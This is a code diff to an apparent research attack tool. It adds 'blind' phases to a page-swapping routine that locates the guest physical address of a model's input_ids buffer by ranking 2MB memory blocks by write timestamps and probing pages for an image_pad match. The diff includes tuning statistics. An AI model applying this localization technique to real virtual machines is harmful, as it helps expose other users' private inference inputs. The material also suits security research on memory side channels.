@@ -210,7 +210,8 @@ def locate_base_gpa(fixed_gpa: int, ip_ref: bytes, ip_mask: Set[int],
                     bootstrap_block: Optional[int] = None,
                     blind: bool = False,
                     candidate_runs: Optional[Dict[Any, Any]] = None,
-                    candidate_page_ts: Optional[Dict[Any, Any]] = None) -> Tuple[Optional[int], int, str, int]:
+                    candidate_page_ts: Optional[Dict[Any, Any]] = None,
+                    window_candidates: Optional[List[Any]] = None) -> Tuple[Optional[int], int, str, int]:
     """
     Filtered Brute-Force 2MB Page Swapper for Base GPA Localization.
     
@@ -281,6 +282,84 @@ def locate_base_gpa(fixed_gpa: int, ip_ref: bytes, ip_mask: Set[int],
                 return pg, total_swaps, f"known@0x{pg:x}", overall_best_hits
             if hits > best_unconfirmed[1]:
                 best_unconfirmed = (pg, hits)
+
+    # Phase KB (blind): the 2MB block is NOT known, so generalize Phase K over
+    # the Stage 2 candidate ranking -- walk blocks best-ranked first and, inside
+    # each, probe only its BLIND_PAGES_PER_BLOCK latest-written pages (per-PAGE
+    # write ts, descending). A wrong block simply yields no image_pad match and
+    # costs that many swaps, so the budget buys depth in the block ranking.
+    #
+    # Why so few pages per block: the input page is the 1st or 2nd latest-written
+    # page of its block in ~90% of samples, so pages beyond the 3rd rarely pay
+    # off, while every extra page cuts how far down the block ranking we reach
+    # before MAX_LOC_SWAPS_SAMPLE runs out. Trace-driven sweep over the completed
+    # run (1,640 samples): m=1 -> 33.9%, m=2 -> 75.2%, m=3 -> 75.6%, m=4 -> 74.0%,
+    # m=8 -> 68.1%, m=40 -> 45.9%. m=3 reaches ~13 blocks, and the true block is
+    # within the top 13 for ~79% of samples, so this captures nearly all of what
+    # the current block ranking allows.
+    # Phase KW (blind, default): Stage 2's time-windowed run*hit ranking. Blocks
+    # in rank order, each with its latest pages first-written inside the window
+    # where input_ids is written (see BLIND_WINDOW_* in common.py); early-stop on
+    # the image_pad match. Needs no anchor, no history and no ground truth.
+    if blind and window_candidates:
+        print(f"    [blind-window] scanning {len(window_candidates)} run*hit-ranked blocks "
+              f"(time window {c.BLIND_WINDOW_LO:.2f}-{c.BLIND_WINDOW_HI:.2f}), "
+              f"{c.BLIND_WINDOW_PAGES_PER_BLOCK} in-window pages each")
+        for rank, entry in enumerate(window_candidates, 1):
+            if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
+                break
+            try:
+                blk = int(entry[0], 16)
+                pages = [int(g, 16) for g in entry[1]]
+            except (TypeError, ValueError, IndexError):
+                continue
+            for pg in pages:
+                if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
+                    break
+                r = probe(pg, "blind_window")
+                if r is None:
+                    continue
+                _, hits = r
+                if hits >= min_match:
+                    print(f"    [loc] blind-window page 0x{pg:x} (block 0x{blk:x}, window rank #{rank}) "
+                          f"img_hits={hits}/{len(ip_mask)} in {total_swaps} swaps -> CONFIRMED input_ids")
+                    return pg, total_swaps, f"blind_window@0x{pg:x}", overall_best_hits
+                if hits > best_unconfirmed[1]:
+                    best_unconfirmed = (pg, hits)
+        print(f"    [blind-window] no match after {total_swaps} swaps")
+
+    # Phase KB (anchor-boosted whole-window ranking) only gets the budget Phase
+    # KW leaves over, e.g. for an old Stage 2 file without window_candidates.
+    if blind and total_swaps < c.MAX_LOC_SWAPS_SAMPLE:
+        pages_per_block = c.BLIND_PAGES_PER_BLOCK
+        n_blocks_probed = 0
+        print(f"    [blind] scanning {len(blocks)} candidate blocks, "
+              f"{pages_per_block} latest-written pages each (early-stop on image_pad match)")
+        for rank, blk in enumerate(blocks, 1):
+            if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
+                break
+            pages = _pages_ts_desc(candidate_page_ts, blk)
+            if not pages:
+                pages = _run_pages_ts_desc(candidate_runs, blk)
+            pages = [p for p in pages if (p & ~(c.BLOCK_SIZE - 1)) == blk][:pages_per_block]
+            if not pages:
+                continue
+            n_blocks_probed += 1
+            for pg in pages:
+                if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
+                    break
+                r = probe(pg, "blind_block")
+                if r is None:
+                    continue
+                _, hits = r
+                if hits >= min_match:
+                    print(f"    [loc] blind page 0x{pg:x} (block rank #{rank}) "
+                          f"img_hits={hits}/{len(ip_mask)} in {total_swaps} swaps "
+                          f"-> CONFIRMED input_ids")
+                    return pg, total_swaps, f"blind@0x{pg:x}", overall_best_hits
+                if hits > best_unconfirmed[1]:
+                    best_unconfirmed = (pg, hits)
+        print(f"    [blind] no match after {n_blocks_probed} blocks / {total_swaps} swaps")
 
     # Phase 0: Adaptive Cache from recent samples
     for blk in recency_list[:2]:
